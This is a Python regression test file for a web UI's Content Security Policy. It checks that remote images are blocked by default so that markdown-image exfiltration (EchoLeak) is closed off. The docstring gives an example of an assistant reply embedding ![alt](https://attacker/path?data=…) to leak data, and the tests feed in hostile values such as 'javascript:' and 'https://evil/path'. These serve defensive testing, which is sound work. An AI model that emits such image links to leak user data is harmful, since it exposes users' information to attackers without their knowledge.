"""Regression tests for #7941: remote-image markdown exfiltration (EchoLeak).

The CSP previously shipped ``img-src 'self' data: https: blob:``, so an
assistant reply containing ``![alt](https://attacker/path?data=…)`` rendered as
a live ``<img>`` and the browser issued the request to any https origin on
render — a zero-click, no-tool-call, no-approval exfiltration channel (the
"markdown image exfiltration" class, EchoLeak et al.).

The fix removes the bare ``https:`` scheme from the default ``img-src`` so
remote images are blocked by default, while keeping same-origin files, inline
``data:`` URIs and ``blob:`` (how the renderer embeds generated/pasted images).
Operators who need remote images can opt back in, per-host or wholesale, via
``HERMES_WEBUI_CSP_IMG_EXTRA``.
"""

from __future__ import annotations

import importlib

import pytest


@pytest.fixture()
def helpers(monkeypatch):
    # Ensure a clean env for each case and a freshly-read module state.
    for var in ("HERMES_WEBUI_CSP_IMG_EXTRA",):
        monkeypatch.delenv(var, raising=False)
    import api.helpers as h
    importlib.reload(h)
    return h


def _img_directive(policy: str) -> str:
    # Return just the `img-src …` directive (without the trailing ';').
    part = next(p for p in policy.split(";") if p.strip().startswith("img-src"))
    return part.strip()


def test_default_img_src_blocks_bare_https(helpers):
    policy = helpers._build_csp_enforced_policy()
    img = _img_directive(policy)
    # Same-origin files, inline data: and blob: stay allowed...
    assert img == "img-src 'self' data: blob:"
    # ...but a bare `https:` scheme (any-remote-image) is GONE — this is the
    # exfiltration channel #7941 closes.
    assert " https:" not in (" " + img)


def test_default_still_allows_inline_and_same_origin_images(helpers):
    img = _img_directive(helpers._build_csp_enforced_policy())
    assert "'self'" in img          # generated local image files
    assert "data:" in img           # inline base64 (renderer-embedded)
    assert "blob:" in img           # object-URL images


def test_opt_in_allowlists_a_specific_host(helpers, monkeypatch):
    monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", "https://images.example.com")
    importlib.reload(helpers)
    img = _img_directive(helpers._build_csp_enforced_policy())
    assert "https://images.example.com" in img
    # Base directives survive the addition.
    assert img.startswith("img-src 'self' data: blob:")
    # A bare scheme was NOT silently added — only the named host.
    assert " https: " not in (img + " ")


def test_opt_out_escape_hatch_restores_wide_https(helpers, monkeypatch):
    monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", "https:")
    importlib.reload(helpers)
    img = _img_directive(helpers._build_csp_enforced_policy())
    assert img == "img-src 'self' data: blob: https:"


def test_invalid_img_extra_is_ignored(helpers, monkeypatch):
    # javascript:, data: re-add attempts, path-bearing or malformed values are
    # rejected wholesale (fail closed to the safe default).
    for bad in ("javascript:", "https://evil/path", "ftp://x", "'unsafe-inline'",
                "https://host:99999", "not a url"):
        monkeypatch.setenv("HERMES_WEBUI_CSP_IMG_EXTRA", bad)
        importlib.reload(helpers)
        img = _img_directive(helpers._build_csp_enforced_policy())
        assert img == "img-src 'self' data: blob:", f"{bad!r} should be ignored"


def test_report_only_policy_also_denies_bare_https(helpers):
    policy = helpers._build_csp_report_only_policy()
    img = _img_directive(policy)
    assert img == "img-src 'self' data: blob:"
    assert "report-uri /api/csp-report" in policy


def test_img_extra_host_with_valid_port_and_wildcard(helpers, monkeypatch):
    monkeypatch.setenv(
        "HERMES_WEBUI_CSP_IMG_EXTRA", "https://*.cdn.example.com https://imgs.example.com:8443"
    )
    importlib.reload(helpers)
    img = _img_directive(helpers._build_csp_enforced_policy())
    assert "https://*.cdn.example.com" in img
    assert "https://imgs.example.com:8443" in img
